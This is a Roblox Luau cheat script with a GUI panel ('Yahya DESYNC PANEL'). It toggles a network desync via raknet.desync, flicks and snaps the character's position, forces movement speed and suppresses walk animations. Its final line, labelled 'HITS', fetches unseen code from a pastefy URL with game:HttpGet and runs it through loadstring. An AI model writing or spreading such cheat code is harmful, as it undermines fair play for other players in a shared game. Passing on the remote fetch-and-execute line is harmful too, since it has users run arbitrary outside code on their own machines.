-- DESYNC FLICK
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer

local Enabled = false
local UnwalkEnabled = false

local SavedCFrame = nil
local DistanceThreshold = 35

local Loop
local SpeedLoop
local UnwalkConnection

-- SETTINGS
local BACK_DISTANCE = -28
local BACK_DISTANCE_TOOL = -37
local FLICK_SPEED = 0.12
local SPEED_VALUE = 10

-- CHARACTER
local function getChar()
    return player.Character or player.CharacterAdded:Wait()
end

local function getRoot()
    return getChar():WaitForChild("HumanoidRootPart")
end

-- SPEED LOOP
local function startSpeedLoop()
    if SpeedLoop then SpeedLoop:Disconnect() end
    SpeedLoop = RunService.Heartbeat:Connect(function()
        if not Enabled then
            SpeedLoop:Disconnect()
            SpeedLoop = nil
            return
        end
        local char = player.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        local root = char:FindFirstChild("HumanoidRootPart")
        if not hum or not root then return end
        if hum.MoveDirection.Magnitude > 0.1 then
            local md = hum.MoveDirection.Unit
            root.AssemblyLinearVelocity = Vector3.new(
                md.X * SPEED_VALUE,
                root.AssemblyLinearVelocity.Y,
                md.Z * SPEED_VALUE
            )
        end
    end)
end

-- DESYNC
local function Enable()
    if Enabled then return end

    local root = getRoot()
    local char = getChar()
    local original = root.CFrame

    local hasTool = char:FindFirstChildOfClass("Tool") ~= nil
    local flickDistance = hasTool and BACK_DISTANCE_TOOL or BACK_DISTANCE

    local backCF = original * CFrame.new(0, 0, flickDistance)
    root.CFrame = backCF
    task.wait(FLICK_SPEED)
    root.CFrame = original

    raknet.desync(true)
    Enabled = true
    SavedCFrame = root.CFrame

    startSpeedLoop()

    Loop = RunService.Heartbeat:Connect(function()
        if not Enabled then return end

        local dist = (root.Position - SavedCFrame.Position).Magnitude
        if dist > DistanceThreshold then
            root.CFrame = SavedCFrame
        else
            SavedCFrame = root.CFrame
        end
    end)
end

local function Disable()
    Enabled = false
    raknet.desync(false)

    if Loop then
        Loop:Disconnect()
        Loop = nil
    end

    if SpeedLoop then
        SpeedLoop:Disconnect()
        SpeedLoop = nil
    end
end

-- UNWALK
local function applyUnwalk(char)
    local humanoid = char:WaitForChild("Humanoid")

    for _, track in pairs(humanoid:GetPlayingAnimationTracks()) do
        track:Stop()
    end

    UnwalkConnection = humanoid.AnimationPlayed:Connect(function(track)
        if UnwalkEnabled then
            track:Stop()
        end
    end)
end

-- GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = player:WaitForChild("PlayerGui")

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 220, 0, 130)
Frame.Position = UDim2.new(0.5, 174, 0, 41)
Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Frame.Parent = ScreenGui
Frame.Active = true
Frame.Draggable = true
Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 12)

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 25)
Title.BackgroundTransparency = 1
Title.Text = "Yahya DESYNC PANEL"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 14
Title.Parent = Frame

local DesyncBtn = Instance.new("TextButton")
DesyncBtn.Size = UDim2.new(0.8, 0, 0, 30)
DesyncBtn.Position = UDim2.new(0.1, 0, 0.35, 0)
DesyncBtn.Text = "DESYNC: OFF"
DesyncBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
DesyncBtn.TextColor3 = Color3.new(1, 1, 1)
DesyncBtn.Font = Enum.Font.GothamBold
DesyncBtn.TextSize = 14
DesyncBtn.Parent = Frame
Instance.new("UICorner", DesyncBtn).CornerRadius = UDim.new(0, 10)

local UnwalkBtn = Instance.new("TextButton")
UnwalkBtn.Size = UDim2.new(0.8, 0, 0, 30)
UnwalkBtn.Position = UDim2.new(0.1, 0, 0.7, 0)
UnwalkBtn.Text = "UNWALK: OFF"
UnwalkBtn.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
UnwalkBtn.TextColor3 = Color3.new(1, 1, 1)
UnwalkBtn.Font = Enum.Font.GothamBold
UnwalkBtn.TextSize = 14
UnwalkBtn.Parent = Frame
Instance.new("UICorner", UnwalkBtn).CornerRadius = UDim.new(0, 10)

-- BUTTONS
DesyncBtn.MouseButton1Click:Connect(function()
    if Enabled then
        Disable()
        DesyncBtn.Text = "DESYNC: OFF"
        DesyncBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    else
        DesyncBtn.Text = "LOADING..."
        DesyncBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 0)

        Enable()

        DesyncBtn.Text = "DESYNC: ON"
        DesyncBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
    end
end)

UnwalkBtn.MouseButton1Click:Connect(function()
    UnwalkEnabled = not UnwalkEnabled

    if UnwalkEnabled then
        UnwalkBtn.Text = "UNWALK: ON"
        UnwalkBtn.BackgroundColor3 = Color3.fromRGB(60, 200, 60)
        local char = player.Character
        if char then applyUnwalk(char) end
    else
        UnwalkBtn.Text = "UNWALK: OFF"
        UnwalkBtn.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
        if UnwalkConnection then
            UnwalkConnection:Disconnect()
        end
    end
end)

-- RESPAWN
player.CharacterAdded:Connect(function(char)
    if UnwalkEnabled then
        applyUnwalk(char)
    end
end)

-- HITS
loadstring(game:HttpGet("https://pastefy.app/AtMulssY/raw"))()
